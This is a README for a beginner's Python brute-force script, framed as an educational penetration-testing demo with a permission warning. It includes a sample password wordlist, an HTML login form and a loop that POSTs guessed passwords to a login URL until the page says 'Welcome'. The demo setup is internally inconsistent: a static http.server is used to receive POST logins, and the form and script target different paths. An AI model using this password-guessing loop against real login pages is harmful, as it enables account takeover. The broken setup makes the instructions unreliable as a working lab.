#  Brute Force Attack Script

## Overview
This project demonstrates a simple brute force attack script using Python. The script attempts to crack a password by systematically trying a list of possible passwords. The goal is to educate about security vulnerabilities and the importance of strong passwords, and to provide a hands-on example for beginners in penetration testing.

 **⚠️ Warning:** This script is for educational purposes only. Do not use it on any system without explicit permission from the owner.

 ## Features
* **Automated Login** Attempts: The script sends POST requests to a web server to attempt logins with different password combinations.
* **Custom Wordlist:** You can supply your own list of potential passwords to test.
* **Success Notification:** The script notifies you when the correct password is found.

## Requirements

* Python 3.x
* `requests` library

You can install the required library using the following command:

`pip install requests`

## Setup

1- Clone the repository:

`git clone https://github.com/yourusername/brute-force-script.git`

`cd brute-force-script`

2- Create a `passwords.txt` file in the same directory with a list of potential passwords, each on a new line:

`password123`

`qwerty`

`letmein`

`admin123`

`senhafoda`

3- Create the HTML login page (if needed):

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>
<body>
    <h2>Login Page</h2>
    <form action="/login" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

4- Run a local server to host the HTML page:

`python3 -m http.server 8000`


## Usage

1- Running the Script:

Edit the `brute_force.py` script to point to your local server:

```
import requests

url = 'http://0.0.0.0:8000/'
usernames = ['admin']
passwords = open('/path/to/your/passwords.txt', 'r').readlines()

for username in usernames:
    for line in passwords:
        password = line.strip()
        response = requests.post(url, data={'username': username, 'password': password, 'submit': 'Login'})
        if "Welcome" in response.text:  
            print(f"=========[+] PASSWORD CRACKED: {password} =========")
            break
        else:
            print(f"[-] Password invalid: {password}")
```

2- Run the Script:

`python3 brute_force.py`

The script will attempt to log in with each password in the passwords.txt file and will notify you when it successfully cracks the password.






